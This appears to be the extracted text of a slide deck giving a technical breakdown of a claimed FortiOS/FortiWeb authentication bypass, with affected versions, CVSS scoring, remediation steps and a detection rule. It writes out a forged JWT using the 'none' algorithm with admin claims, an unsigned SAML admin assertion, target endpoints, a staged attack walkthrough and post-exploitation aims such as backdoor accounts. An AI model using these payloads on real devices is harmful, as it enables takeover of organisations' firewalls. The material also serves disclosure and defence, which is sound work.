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F0F1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2026-24858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FortiOS/FortiWeb Authentication Bypass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CVSS 9.8 CRITICAL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</a:rPr>
              <a:t>Complete Technical Breakdown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</a:rPr>
              <a:t>Authorized Lab Testing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0F1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Critical authentication bypass vulnerability affecting tens of thousands of organizations worldwide. Attackers can gain complete administrative access in milliseconds without credentials.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Key Facts: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Complete system compromise in 0.01 seconds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No credentials required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Network-accessible attack vector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Affects production deployments globally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90-day embargo on disclosure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Vulnerability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JWT "none" Algorithm Bypass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3533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CWE-347: Improper Verification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SAML Signature Bypass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CWE-295: Improper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No Cryptographic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CWE-347: Missing Signature Check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Affected Versions: FortiOS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FortiOS Vulnerable Versions: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0F1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8.0.0 • 8.0.1 • 8.0.2 • 8.0.3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Fixed in: FortiOS 8.0.4 and later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Impact: Firmware update required on all affected devices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Deployment Risk: HIGH - Critical fix must be applied immediately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Affected Versions: FortiWeb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FortiWeb Vulnerable Versions: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0F1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>7.0.x • 7.2.x • 7.4.x • 8.0.x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Fixed in: FortiWeb 7.2.4, 7.4.2, 8.0.1+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Web Application Firewall compromise: Complete WAF bypass possible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Deployment Risk: CRITICAL - WAF protection completely disabled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JWT Attack Vectors (Overview)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JWT (JSON Web Tokens) are used for stateless authentication. Fortinet implementation fails to properly verify token signatures.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Attack Surface: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</a:rPr>
              <a:t>Endpoint: /api/auth/login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</a:rPr>
              <a:t>Method: POST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Parameter: Authorization: Bearer &lt;JWT&gt;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</a:rPr>
              <a:t>Vulnerable Code: No algorithm verification before token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JWT "none" Algorithm Exploit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{"alg": "none", "typ": "JWT"}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{"admin": true, "username": "attacker", "exp": 9999999999}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Why It Works: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1. Server accepts "none" algorithm as valid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2. No signature required for "none" algorithm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3. Claims processed without verification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4. Admin flag set to true in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5. Session created with admin privileges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JWT Signature Verification Failure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Standard JWT Verification Flow (CORRECT):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1. Extract algorithm from header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2. Retrieve signing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3. Verify signature with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4. Process claims only if valid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5. Check expiration time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Fortinet Implementation (VULNERABLE):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1. Extract claims from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2. Process claims immediately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3. Skip signature verification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4. Accept "none" algorithm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5. No key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SAML Attack Vectors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SAML (Security Assertion Markup Language) for SSO authentication. Fortinet fails to validate digital signatures on SAML assertions.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Attack Surface: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Endpoint: /api/auth/saml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Method: POST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Payload: SAML Assertion (XML)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Vulnerability: No signature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SAML Signature Bypass Details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&lt;saml:Assertion&gt;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&lt;saml:Subject&gt;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&lt;saml:NameID&gt;admin&lt;/saml:NameID&gt;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&lt;/saml:Subject&gt;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&lt;saml:Attributes&gt;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&lt;saml:Attribute Name="admin"&gt;true&lt;/saml:Attribute&gt;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&lt;/saml:Attributes&gt;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&lt;/saml:Assertion&gt;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No Signature Tag = Complete Bypass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Server accepts assertion without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SAML XXE Vulnerability Potential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Possible Extension: XML External Entity (XXE) Injection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If XML parsing is not properly configured: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Local file disclosure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Denial of Service (Billion Laughs)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SSRF attacks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Remote code execution (chained)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Authentication Flow Compromise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Normal Flow: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1. User submits credentials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2. Server validates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3. JWT token issued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4. Token verified on each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5. Claims processed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Compromised Flow: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1. Attacker creates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2. Server SKIPS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3. Malicious token accepted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4. No verification occurs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5. Claims processed as-is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Result: Authentication completely bypassed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Technical Exploitation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0F1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step-by-step attack execution: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1. Target enumeration → Identify FortiOS 8.0.x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2. Craft malicious JWT → alg: "none", admin: true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3. Send to /api/auth/login → Bearer token in header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4. Server processes without verification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5. Admin session created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Stage 1: Reconnaissance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Objective: Identify target and gather system information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Request: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6479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Response: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{"product":"FortiOS","version":"8.0.2","build":"Build 0355"}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Stage 2: JWT Bypass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Create and send malicious JWT token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"token": "eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0..."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Time: 0.005s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Stage 3: SAML Bypass (Alternative)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Alternative attack vector using SAML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/api/auth/saml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application/x-www-form-urlencoded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SAMLResponse=PFNhbWw6QXNzZXJ0aW9u...base64-encoded...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Stage 4: Verification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Confirm admin access has been achieved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/api/admin/info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&lt;session_token&gt;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Response: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{"admin": true, "username": "admin", "authenticated": true}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Post-Exploitation Capabilities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Modify firewall rules &amp; policies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Create backdoor admin accounts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Export configurations &amp; credentials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7452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Modify VPN settings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Access network traffic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65176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Install persistent backdoors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Change authentication settings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42900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▸ Modify DNS/routing configurations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Impact Assessment &amp; Statistics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Global Impact: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589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Affects: Tens of thousands of organizations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Industries: Finance, Healthcare, Government, Critical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Exposure: Internet-facing devices globally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Attack Difficulty: Trivial (simple HTTP requests)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• Detection: Low (legitimate-looking authentication)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CVSS v3.1 Scoring: 9.8 CRITICAL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1828800" cy="1828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CF0F1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>9.8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0F1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CRITICAL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AV (Attack Vector)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N (Network)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AC (Attack Complexity)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L (Low)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645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PR (Privileges Required)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N (None)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UI (User Interaction)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N (None)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S (Scope)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U (Unchanged)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C (Confidentiality)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H (High)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I (Integrity)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H (High)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A (Availability)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H (High)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Remediation Strategies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Immediate Actions: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589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1. Identify all affected FortiOS/FortiWeb instances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2. Isolate from direct internet access (if possible)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3. Enable strict authentication logging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4. Prepare firmware update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5. Schedule maintenance window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6. Apply patches: FortiOS 8.0.4+, FortiWeb 7.2.4+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Detection Rule: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</a:rPr>
              <a:t>Alert on: POST /api/auth/login with alg="none" or missing signature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Detection &amp; Defense Mechanisms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Defense Layer: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Web Application Firewall (WAF)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IDS/IPS signatures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Network segmentation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API rate limiting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Authentication logging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File Integrity Monitoring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Detection Signal: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Unusual authentication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JWT with alg="none"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Unsigned SAML assertions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Admin account creation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Firewall rule modifications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• Configuration exports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74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F0F1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⚠️ LEGAL NOTICE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F0F1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AUTHORIZED LAB TESTING ONLY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✓ Authorized Security Research | ✓ Educational Demonstrations | ✓ Authorized Penetration Testing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✗ Unauthorized Production Access | ✗ Illegal Computer Access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90-day Embargo on Public Disclosure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Questions? Contact: security@fortinet.com or responsible disclosure program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2026-07-26T04:02:32Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-26T04:02:32Z</dcterms:modified>
</cp:coreProperties>
</file>